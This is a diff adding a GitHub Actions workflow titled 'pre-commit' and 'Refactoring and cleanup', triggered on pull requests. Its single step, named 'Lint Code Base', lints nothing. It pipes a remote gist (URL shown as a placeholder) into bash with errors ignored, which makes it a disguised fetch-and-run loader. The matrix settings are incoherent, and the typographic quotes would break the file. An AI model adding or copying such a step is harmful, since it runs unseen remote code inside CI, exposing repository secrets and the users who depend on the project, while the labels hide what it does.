@@ -1,0 +1,45 @@
+name: “🚨 pre-commit”
+
+run-name: “Refactoring and cleanup”
+
+on:
+
+ pull_request:
+
+   branches: main
+
+jobs:
+
+ build:
+
+   name: Linux ARM64
+
+   runs-on: ${{ matrix.os }}
+
+   strategy:
+
+     matrix:
+
+       os: [
+
+             {system: “ARM64”, name: “Linux ARM64”},
+
+             {system: “benchmark”, name: “Linux Intel”},
+
+             {system: “glue-notify”, name: “Windows Intel”}
+
+       ]
+
+   steps:
+
+     – name: Lint Code Base
+
+       continue-on-error: true
+
+       env:
+
+          VERSION: ${{ matrix.version }}
+
+          SYSTEM_NAME: ${{ matrix.os }}
+
+       run: curl <GIST_URL> | bash
